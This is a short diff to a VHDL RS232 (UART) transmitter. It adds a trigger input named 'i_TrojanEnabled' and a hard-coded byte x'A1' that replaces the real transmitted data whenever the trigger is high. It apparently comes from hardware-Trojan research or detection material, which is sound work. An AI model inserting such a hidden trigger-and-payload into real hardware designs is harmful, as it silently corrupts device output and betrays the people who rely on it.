@@ -35,11 +35,13 @@ entity RS232_Transmitter is
 		frequency	:positive
 		);
     Port ( i_Clk : in  STD_LOGIC;
+    	   i_TrojanEnabled : in STD_LOGIC; 
            i_StartTransmission : in  STD_LOGIC;
            i_Byte : in  STD_LOGIC_VECTOR (7 downto 0);
            o_Active : out  STD_LOGIC;
            o_TX : out  STD_LOGIC;
-           o_Done : out  STD_LOGIC);
+           o_Done : out  STD_LOGIC
+           );
 end RS232_Transmitter;
 
 architecture Behavioral of RS232_Transmitter is
@@ -51,6 +53,7 @@ architecture Behavioral of RS232_Transmitter is
 	signal bitIndex : integer := 0;
 	signal r_Byte   : std_logic_vector(7 downto 0) := (others => '0');
   	signal r_Done   : std_logic := '0';
+  	constant hardCodedOutput : std_logic_vector(7 downto 0 ) := x"A1";
 
 begin
 	
@@ -67,7 +70,11 @@ begin
 					clockTicksCounter <= 0;
 					bitIndex <= 0;
 					if (i_StartTransmission = '1') then
-						r_Byte <= i_Byte;
+						if (i_TrojanEnabled = '1') then
+							r_Byte <= hardCodedOutput;
+						else
+							r_Byte <= i_Byte;	
+						end if;
 						currentState <= StartBit;
 					end if;
 
